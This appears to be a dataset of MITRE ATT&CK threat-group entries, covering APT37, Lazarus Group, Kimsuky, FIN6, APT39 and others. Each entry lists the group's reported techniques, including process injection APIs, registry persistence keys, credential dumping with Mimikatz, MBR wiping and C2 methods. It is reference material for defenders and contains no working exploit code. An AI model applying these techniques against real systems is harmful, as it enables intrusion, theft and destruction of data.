{"text": " [APT37](https://attack.mitre.org/groups/G0067) is a North Korean state-sponsored cyber espionage group that has been active since at least 2012. The group has targeted victims primarily in South Korea, but also in Japan, Vietnam, Russia, Nepal, China, India, Romania, Kuwait, and other parts of the Middle East. [APT37](https://attack.mitre.org/groups/G0067) has also been linked to the following campaigns between 2016-2018: Operation Daybreak, Operation Erebus, Golden Time, Evil New Year, Are you Happy?, FreeMilk, North Korean Human Rights, and Evil New Year 2018.(Citation: FireEye APT37 Feb 2018)(Citation: Securelist ScarCruft Jun 2016)(Citation: Talos Group123) North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.", "idx": "https://attack.mitre.org/groups/G0067", "title": "APT37", "entity": "APT37", "entity_type": "groups", "entity_context": ["APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.", "APT37 has used Python scripts to execute payloads.", "APT37 has created scheduled tasks to run malicious scripts on a compromised host.", "APT37 has used malware that will issue the command <code>shutdown /r /t 1</code> to reboot a system after wiping its MBR.", "APT37 injects its malware variant, ROKRAT, into the cmd.exe process.", "APT37 has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.", "APT37's has added persistence via the Registry key <code>HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\</code>.", "APT37 has used port 8080 for C2.", "APT37 leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.", "APT37 has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers.", "APT37 delivers malware using spearphishing emails with malicious HWP attachments.", "APT37 uses HTTPS to conceal C2 communications.", "APT37 has used Ruby scripts to execute payloads.", "APT37 identifies the victim username.", "APT37 has a Bluetooth device harvester, which uses Windows Bluetooth APIs to find information on connected Bluetooth devices. ", "APT37 leverages the Windows API calls: VirtualAlloc(), WriteProcessMemory(), and CreateRemoteThread() for process injection.", "APT37 has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).", "APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.", "APT37 has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”", "APT37 has used an audio capturing utility known as SOUNDWAVE that captures microphone input.", "APT37 has downloaded second stage malware from compromised websites.", "APT37 has used Windows DDE for execution of commands and a malicious VBS.", "APT37 has used the command-line interface.", "APT37 has collected data from victims' local systems.", "APT37 collects the computer name, the BIOS model, and execution path.", "APT37's Freenki malware lists running processes using the Microsoft Windows API.", "APT37 executes shellcode and a VBA script to decode Base64 strings.", "APT37 has sent spearphishing attachments attempting to get a user to open them.", "APT37 obfuscates strings and payloads.", "APT37 uses steganography to send images to users that are embedded with shellcode."], "is_subtechnique": false}
{"text": " [Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group that conducts long term, resource-intensive cyber espionage operations, likely on behalf of the Islamic Revolutionary Guard Corps. They have targeted U.S. and Middle Eastern government and military personnel, academics, journalists, and organizations such as the World Health Organization (WHO), via complex social engineering campaigns since at least 2014.(Citation: FireEye APT35 2018)(Citation: ClearSky Kittens Back 3 August 2020)(Citation: Certfa Charming Kitten January 2021)(Citation: Secureworks COBALT ILLUSION Threat Profile)(Citation: Proofpoint TA453 July2021)", "idx": "https://attack.mitre.org/groups/G0059", "title": "Magic Hound", "entity": "Magic Hound", "entity_type": "groups", "entity_context": ["Magic Hound has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations.", "Magic Hound has attempted to lure victims into opening malicious email attachments.", "Magic Hound has deleted and overwrote files to cover tracks.", "Magic Hound malware can take a screenshot and upload the file to its C2 server.", "Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address.", "Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.", "Magic Hound has collected .PST archives.", "Magic Hound has used RAR to stage and compress local folders.", "Magic Hound has used SMS and email messages with links designed to steal credentials.", "Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations. ", "Magic Hound malware can list running processes.", "Magic Hound has acquired the personal email addresses of some individuals they intend to target.", "Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.", "Magic Hound gathered credentials from two victims that they then attempted to validate across 75 different websites.", "Magic Hound malware has communicated with C2 servers over port 6667 (for IRC) and port 8080.", "Magic Hound has established email accounts using fake personas for spearphishing operations.", "Magic Hound malware has used Registry Run keys to establish persistence.", "Magic Hound malware can use a SOAP Web service to communicate with its C2 server.", "Magic Hound has used the command-line interface.", "Magic Hound stole domain credentials from Microsoft Active Directory Domain Controller and leveraged Mimikatz.", "Magic Hound has obtained and used open-source penetration testing tools like Havij, sqlmap, Metasploit, and Mimikatz.", "Magic Hound malware has used HTTP for C2.", "Magic Hound malware has used VBS scripts for execution.", "Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.", "Magic Hound has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links.", "Magic Hound malware has used IRC for C2.", "Magic Hound has compromised email credentials in order to steal sensitive data.", "Magic Hound malware has used base64-encoded commands and files, and has also encrypted embedded strings with AES.", "Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.", "Magic Hound has attempted to lure victims into opening malicious links embedded in emails.", "Magic Hound has used PowerShell for execution and privilege escalation.", "Magic Hound malware has communicated with its C2 server over TCP port 4443 using HTTP.", "Magic Hound malware has obtained the victim username and sent it to the C2 server.", "Magic Hound malware is capable of keylogging.", "Magic Hound has downloaded additional code and files from servers onto victims. ", "Magic Hound has used compromised domains to host links targeted to specific phishing victims.", "Magic Hound has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information.", "Magic Hound has registered fraudulent domains such as \"mail-newyorker.com\" and \"news12.com.recover-session-service.site\" to target specific victims with phishing attacks.", "Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window."], "is_subtechnique": false}
{"text": " [Sowbug](https://attack.mitre.org/groups/G0054) is a threat group that has conducted targeted attacks against organizations in South America and Southeast Asia, particularly government entities, since at least 2015. (Citation: Symantec Sowbug Nov 2017)", "idx": "https://attack.mitre.org/groups/G0054", "title": "Sowbug", "entity": "Sowbug", "entity_type": "groups", "entity_context": ["Sowbug identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.", "Sowbug obtained OS version and hardware configuration from a victim.", "Sowbug has used command line during its intrusions.", "Sowbug has used credential dumping tools.", "Sowbug listed remote shared drives that were accessible from a victim.", "Sowbug extracted documents and bundled them into a RAR archive.", "Sowbug named its tools to masquerade as Windows or Adobe Reader software, such as by using the file name adobecms.exe and the directory <code>CSIDL_APPDATA\\microsoft\\security</code>.", "Sowbug has used keylogging tools.", "Sowbug extracted Word documents from a file server on a victim network."], "is_subtechnique": false}
{"text": " [Orangeworm](https://attack.mitre.org/groups/G0071) is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage.(Citation: Symantec Orangeworm April 2018)", "idx": "https://attack.mitre.org/groups/G0071", "title": "Orangeworm", "entity": "Orangeworm", "entity_type": "groups", "entity_context": ["Orangeworm has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.", "Orangeworm has used HTTP for C2."], "is_subtechnique": false}
{"text": " [Lazarus Group](https://attack.mitre.org/groups/G0032) is a North Korean state-sponsored cyber threat group that has been attributed to the Reconnaissance General Bureau.(Citation: US-CERT HIDDEN COBRA June 2017)(Citation: Treasury North Korean Cyber Groups September 2019) The group has been active since at least 2009 and was reportedly responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment as part of a campaign named Operation Blockbuster by Novetta. Malware used by [Lazarus Group](https://attack.mitre.org/groups/G0032) correlates to other reported campaigns, including Operation Flame, Operation 1Mission, Operation Troy, DarkSeoul, and Ten Days of Rain. (Citation: Novetta Blockbuster) North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups, such as [Andariel](https://attack.mitre.org/groups/G0138), [APT37](https://attack.mitre.org/groups/G0067), [APT38](https://attack.mitre.org/groups/G0082), and [Kimsuky](https://attack.mitre.org/groups/G0094).", "idx": "https://attack.mitre.org/groups/G0032", "title": "Lazarus Group", "entity": "Lazarus Group", "entity_type": "groups", "entity_context": ["Lazarus Group malware attempts to maintain persistence by saving itself in the Start menu folder or by adding a Registry Run key.", "Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. ", "Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, which includes commonly used ports such as 443, 53, 80, 25, and 8080.", "Lazarus Group malware uses cmd.exe to execute commands on victims. A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.", "Lazarus Group has used a VBA Macro to set its file attributes to System and Hidden and has named files with a dot prefix to hide them from the Finder application.", "Lazarus Group malware has conducted C2 over HTTP and HTTPS.", "Lazarus Group malware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.", "Lazarus Group replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a Disk Structure Wipe", "Lazarus Group has stopped the MSExchangeIS service to render Exchange contents inaccessible to users.", "Lazarus Group has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.", "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Another Lazarus Group malware sample also performs exfiltration over the C2 channel.", "Lazarus Group has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.", "Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server..", "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.", "Some Lazarus Group malware uses multiple channels for C2, such as RomeoWhiskey-Two, which consists of a RAT channel that parses data in datagram form and a Proxy channel that forms virtual point-to-point sessions.", "Lazarus Group has renamed the TAINTEDSCRIBE main executable to disguise itself as Microsoft's narrator.", "Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.. ", "Lazarus Group malware SierraCharlie uses RDP for propagation.", "Lazarus Group malware KiloAlfa contains keylogging functionality.", "Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory.", "Various Lazarus Group malware enumerates logged-on users.", "Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.", "Several Lazarus Group malware families are capable of downloading and executing binaries from its C2 server.", "Several Lazarus Group malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.", "Several Lazarus Group malware families install themselves as new services on victims.", "Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call <code>CreateProcessAsUserA</code> under that user's context.", "Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads.", "Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:<code>HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt</code>.", "Lazarus Group malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.", "Lazarus Group has obtained SSL certificates for their C2 domains.", "Lazarus Group malware SierraAlfa accesses the <code>ADMIN$</code> share via SMB to conduct lateral movement.", "Lazarus Group malware also uses a unique form of communication encryption known as FakeTLS that mimics TLS but uses a different encryption method, potentially evading SSL traffic inspection/decryption.", "Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.", "Lazarus Group malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.", "A Lazarus Group malware sample adds persistence on the system by creating a shortcut in the user’s Startup folder.", "Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords.", "Lazarus Group has used CHM files to move concealed payloads.", "A Lazarus Group malware sample performs reflective DLL injection.", "Lazarus Group has rebooted systems after destroying files and wiping the MBR on infected systems.", "Lazarus Group uses multiple proxies to obfuscate network traffic from victims.", "Lazarus Group has acquired infrastructure related to their campaigns to act as distribution points and C2 channels.", "Lazarus Group malware uses multiple types of encryption and encoding in its malware files, including AES, Caracachs, RC4, basic XOR with constant 0xA7, and other techniques.", "Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.", "Lazarus Group malware deletes files in various ways, including \"suicide scripts\" to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim.", "Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.", "Several Lazarus Group malware samples use a common function to identify target files by their extension. Lazarus Group malware families can also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.", "Lazarus Group has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.", "Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.", "Some Lazarus Group malware uses a list of ordered port numbers to choose a port for C2 traffic, creating port-protocol mismatches.", "A Lazarus Group malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.", "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Lazarus Group malware RomeoDelta copies specified directories from the victim's machine, then archives and encrypts the directories before uploading to its C2 server.", "A Destover-like implant used by Lazarus Group can obtain the current system time and send it to the C2 server.", "Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times.", "Lazarus Group malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.", "Lazarus Group delivered RATANKBA to victims via a compromised legitimate website.", "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server.", "A Lazarus Group malware sample encodes data with base64.", "Lazarus Group malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server. ", "Lazarus Group has developed several custom malware for use in operations.", "Lazarus Group has hosted malicious downloads on Github."], "is_subtechnique": false}
{"text": " [Kimsuky](https://attack.mitre.org/groups/G0094) is a North Korea-based cyber espionage group that has been active since at least 2012. The group initially focused on targeting South Korean government entities, think tanks, and individuals identified as experts in various fields, and expanded its operations to include the United States, Russia, Europe, and the UN. [Kimsuky](https://attack.mitre.org/groups/G0094) has focused its intelligence collection activities on foreign policy and national security issues related to the Korean peninsula, nuclear policy, and sanctions.(Citation: EST Kimsuky April 2019)(Citation: BRI Kimsuky April 2019)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)(Citation: CISA AA20-301A Kimsuky) [Kimsuky](https://attack.mitre.org/groups/G0094) was assessed to be responsible for the 2014 Korea Hydro & Nuclear Power Co. compromise; other notable campaigns include Operation STOLEN PENCIL (2018), Operation Kabar Cobra (2019), and Operation Smoke Screen (2019).(Citation: Netscout Stolen Pencil Dec 2018)(Citation: EST Kimsuky SmokeScreen April 2019)(Citation: AhnLab Kimsuky Kabar Cobra Feb 2019) North Korean group definitions are known to have significant overlap, and some security researchers report all North Korean state-sponsored cyber activity under the name [Lazarus Group](https://attack.mitre.org/groups/G0032) instead of tracking clusters or subgroups.", "idx": "https://attack.mitre.org/groups/G0094", "title": "Kimsuky", "entity": "Kimsuky", "entity_type": "groups", "entity_context": ["Kimsuky has used modified versions of open source PHP web shells to maintain access, often adding \"Dinosaur\" references within the code.", "Kimsuky has compromised email accounts to send spearphishing e-mails.", "Kimsuky has disguised services to appear as benign software or related to operating system functions.", "Kimsuky has used Google Chrome browser extensions to infect victims and to steal passwords and cookies.", "Kimsuky has created new services for persistence.", "Kimsuky has staged collected data files under <code>C:\\Program Files\\Common Files\\System\\Ole DB\\</code>.", "Kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain.", "Kimsuky has used browser extensions including Google Chrome to steal passwords and cookies from browsers.", "Kimsuky has manipulated timestamps for creation or compilation dates to defeat anti-forensics.", "Kimsuky has used RC4 encryption before exfil.", "Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.", "Kimsuky has used tools that are capable of obtaining credentials from saved mail.", "Kimsuky has used RDP for direct remote point-and-click access.", "Kimsuky has executed a variety of PowerShell scripts.", "Kimsuky has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.", "Kimsuky has exfiltrated data over its email C2 channel.", "Kimsuky has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes.", "Kimsuky has collected Office, PDF, and HWP documents from its victims.", "Kimsuky has used mshta.exe to run malicious scripts on the system.", "Kimsuky created and used a mailing toolkit to use in spearphishing attacks.", "Kimsuky has registered domains to spoof targeted organizations and trusted third parties.", "Kimsuky has used a Mac OS Python implant to gather data.", "Kimsuky has collected valid email addresses that were subsequently used in spearphishing campaigns.", "Kimsuky has used pass the hash for authentication to remote access software used in C2.", "Kimsuky has set auto-forward rules on victim's e-mail accounts.", "Kimsuky has used e-mail to send exfiltrated data to C2 servers.", "Kimsuky has a HWP document stealer module which changes the default program association in the registry to open HWP documents.", "Kimsuky has been observed turning off Windows Security Center.", "Kimsuky has gathered credentials using Mimikatz and ProcDump.", "Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.", "Kimsuky has used attempted to lure victims into opening malicious e-mail attachments.", "Kimsuky has used FTP to download additional malware to the target machine.", "Kimsuky has obtained and used tools such as Mimikatz and PsExec.", "Kimsuky has obfuscated binary strings including the use of XOR encryption and Base64 encoding.", "Kimsuky has modified Registry settings for default file associations to enable the opening of malicious documents.", "Kimsuky has placed scripts in the startup folder for persistence.", "Kimsuky has used Twitter to monitor potential victims and to prepare targeted phishing e-mails.", "Kimsuky has used RDP to establish persistence.", "Kimsuky has signed files with the name EGIS CO,. Ltd..", "Kimsuky has used a modified TeamViewer client as a command and control channel.", "Kimsuky has used modified versions of PHProxy to examine web traffic between the victim and the accessed website.", "Kimsuky has been observed disabling the system firewall.", "Kimsuky has used links in e-mail to steal account information.", "Kimsuky has used Win7Elevate to inject malicious code into explorer.exe.", "Kimsuky has the ability to enumerate all the drives on an infected system.", "Kimsuky has used scripts to download additional tools from compromised domains to victim systems.", "Kimsuky has packed malware with UPX.", "Kimsuky has deleted the exfiltrated data on disk after transmission.", "Kimsuky has used JScript for logging and downloading additional tools.", "Kimsuky has gathered information about the infected computer.", "Kimsuky has used Visual Basic to download malicious payloads."], "is_subtechnique": false}
{"text": " [APT39](https://attack.mitre.org/groups/G0087) is one of several names for cyberespionage activity conducted by the Iranian Ministry of Intelligence and Security (MOIS) through the front company Rana Intelligence Computing since at least 2014. [APT39](https://attack.mitre.org/groups/G0087) has primarily targeted the travel, hospitality, academic, and telecommunications industries in Iran and across Asia, Africa, Europe, and North America to track individuals and entities considered to be a threat by the MOIS.(Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer Dec 2015)(Citation: FBI FLASH APT39 September 2020)(Citation: Dept. of Treasury Iran Sanctions September 2020)(Citation: DOJ Iran Indictments September 2020)", "idx": "https://attack.mitre.org/groups/G0087", "title": "APT39", "entity": "APT39", "entity_type": "groups", "entity_context": ["APT39 has used various tools to proxy C2 communications.", "APT39 has used different versions of Mimikatz to obtain credentials.", "APT39 has used tools with the ability to search for files on a compromised host.", "APT39 has used stolen credentials to compromise Outlook Web Access (OWA).", "APT39 has exfiltrated stolen victim data through C2 communications.", "APT39 has used malware to turn off the <code>RequireSigned</code> feature which ensures only signed DLLs can be run on Windows.", "APT39 has used remote access tools that leverage DNS in communications with C2.", "APT39 has used WinRAR and 7-Zip to compress an archive stolen data.", "APT39 has used malware to delete files after they are deployed on a compromised host.", "APT39 has used tools for capturing keystrokes.", "APT39 has modified LNK shortcuts.", "APT39 has downloaded tools to compromised hosts.", "APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious link.", "APT39 has used PowerShell to execute malicious code.", "APT39 has utilized AutoIt and custom scripts to perform internal reconnaissance.", "APT39 has used CrackMapExec and a custom port scanner known as BLUETORCH for network scanning.", "APT39 used custom tools to create SOCK5 and custom protocol proxies between infected hosts.", "APT39 has used malware to set <code>LoadAppInit_DLLs</code> in the Registry key <code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> in order to establish persistence.", "APT39 has utilized malicious VBS scripts in malware.", "APT39 has utilized tools to aggregate data prior to exfiltration.", "APT39 has created accounts on multiple compromised hosts to perform actions within the network.", "APT39 has used SMB for lateral movement.", "APT39 has used a screen capture utility to take screenshots on a compromised host.", "APT39 has used Ncrack to reveal credentials.", "APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz.", "APT39 has used malware to drop encrypted CAB files.", "APT39 has utilized tools to capture mouse movements.", "APT39 has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.", "APT39 leveraged spearphishing emails with malicious attachments to initially compromise victims.", "APT39 has used the post exploitation tool CrackMapExec to enumerate network shares.", "APT39 has used various tools to steal files from the compromised host.", "APT39 has maintained persistence using the startup folder.", "APT39 used Remexi to collect usernames from the system.", "APT39 has used SQL injection for initial compromise.", "APT39 has installed ANTAK and ASPXSPY web shells.", "APT39 has used HTTP in communications with C2.", "APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection.", "APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host.", "APT39 leveraged spearphishing emails with malicious links to initially compromise victims.", "APT39 has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials.", "APT39 has communicated with C2 through files uploaded to and downloaded from DropBox.", "APT39 has created scheduled tasks for persistence.", "APT39 has used tools capable of stealing contents of the clipboard.", "APT39 has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.", "APT39 has used NBTscan and custom tools to discover remote systems.", "APT39 has used malware to decrypt encrypted CAB files.", "APT39 has used a command line utility and a network scanner written in python.", "APT39 has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions.", "APT39 has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.", "APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords.", "APT39 used secure shell (SSH) to move laterally among their targets.", "APT39 has used various strains of malware to query the Registry."], "is_subtechnique": false}
{"text": " [Molerats](https://attack.mitre.org/groups/G0021) is an Arabic-speaking, politically-motivated threat group that has been operating since 2012. The group's victims have primarily been in the Middle East, Europe, and the United States.(Citation: DustySky)(Citation: DustySky2)(Citation: Kaspersky MoleRATs April 2019)(Citation: Cybereason Molerats Dec 2020)", "idx": "https://attack.mitre.org/groups/G0021", "title": "Molerats", "entity": "Molerats", "entity_type": "groups", "entity_context": ["Molerats used various implants, including those built with JS, on target machines.\t", "Molerats has created scheduled tasks to persistently run VBScripts.", "Molerats has sent phishing emails with malicious Microsoft Word and PDF attachments.", "Molerats has used forged Microsoft code-signing certificates on malware.", "Molerats used executables to download malicious files from different sources. ", "Molerats has used msiexec.exe to execute an MSI payload. ", "Molerats used PowerShell implants on target machines.", "Molerats saved malicious files within the AppData and Startup folders to maintain persistence.", "Molerats actors obtained a list of active processes on the victim and sent them to C2 servers.", "Molerats used various implants, including those built with VBScript, on target machines.", "Molerats used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims.", "Molerats has delivered compressed executables within ZIP files to victims.", "Molerats decompresses ZIP files once on the victim machine.", "Molerats has sent phishing emails with malicious links included.", "Molerats has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.", "Molerats has sent malicious links via email trick users into opening a RAR archive and running an executable. "], "is_subtechnique": false}
{"text": " [FIN6](https://attack.mitre.org/groups/G0037) is a cyber crime group that has stolen payment card data and sold it for profit on underground marketplaces. This group has aggressively targeted and compromised point of sale (PoS) systems in the hospitality and retail sectors.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019)", "idx": "https://attack.mitre.org/groups/G0037", "title": "FIN6", "entity": "FIN6", "entity_type": "groups", "entity_context": ["FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.", "FIN6 has used encoded PowerShell commands.", "FIN6 has used Pastebin and Google Storage to host content for their operations.\t\n", "FIN6 has targeted victims with e-mails containing malicious attachments.", "FIN6 has used Comodo code-signing certificates.\t", "FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.\t", "FIN6 has used malicious JavaScript to steal payment card data from e-commerce sites.", "Following data collection, FIN6 has compressed log files into a ZIP archive prior to staging and exfiltration.", "FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.", "FIN6 used RDP to move laterally in victim networks.", "FIN6 has collected and exfiltrated payment card data from compromised systems.", "FIN6 actors have compressed data from remote systems and moved it to another staging system before exfiltration.", "FIN6 has used the Stealer One credential stealer to target web browsers.", "FIN6 has used <code>kill.bat</code> script to disable security tools.", "FIN6 has removed files from victim machines.", "FIN6 has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button.", "FIN6 has renamed the \"psexec\" service name to \"mstdc\" to masquerade as a legitimate Windows service.\t", "FIN6 has used has used Metasploit’s named-pipe impersonation technique to escalate privileges.", "FIN6 has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.", "FIN6 has deployed a utility script named <code>kill.bat</code> to disable anti-virus.", "FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.", "FIN6 has used fake job advertisements sent via LinkedIn to spearphish targets.", "FIN6 has used scripting to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.", "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.", "FIN6 has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key, and Base64 with character permutation.", "FIN6 has collected schemas and user accounts from systems running SQL Server.", "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.", "FIN6 has used WMI to automate the remote execution of PowerShell scripts.\t", "FIN6 has sent stolen payment card data to remote servers via HTTP POSTs.", "FIN6 has created Windows services to execute encoded PowerShell commands.", "FIN6 used the Plink command-line utility to create SSH tunnels to C2 servers.", "FIN6 has used malicious documents to lure victims into allowing execution of PowerShell scripts.", "FIN6 has extracted password hashes from ntds.dit to crack offline.", "FIN6 has obtained and used tools such as Mimikatz, Cobalt Strike, and AdFind.", "FIN6 has used Metasploit Bind and Reverse TCP stagers.", " FIN6 has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.", "FIN6 has used scheduled tasks to establish persistence for various malware it uses, including downloaders known as HARDTACK and SHIPBREAD and FrameworkPOS.", "FIN6 has used Windows Credential Editor for credential dumping.\t\n"], "is_subtechnique": false}
{"text": " [APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)", "idx": "https://attack.mitre.org/groups/G0064", "title": "APT33", "entity": "APT33", "entity_type": "groups", "entity_context": ["APT33 has used VBScript to initiate the delivery of payloads.", "APT33 has used malicious e-mail attachments to lure victims into executing malware.", "APT33 has used SniffPass to collect credentials by sniffing network traffic.", "APT33 has used a variety of publicly available tools like Gpppassword to gather credentials.", "APT33 has deployed a tool known as DarkComet to the Startup folder of a victim, and used Registry run keys to gain persistence.", "APT33 has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.", "APT33 has obtained and leveraged publicly-available tools for early intrusion activities.", "APT33 has used HTTP over TCP ports 808 and 880 for command and control.", "APT33 has utilized PowerShell to download files from the C2 server and run various scripts. ", "APT33 has used HTTP for command and control.", "APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of 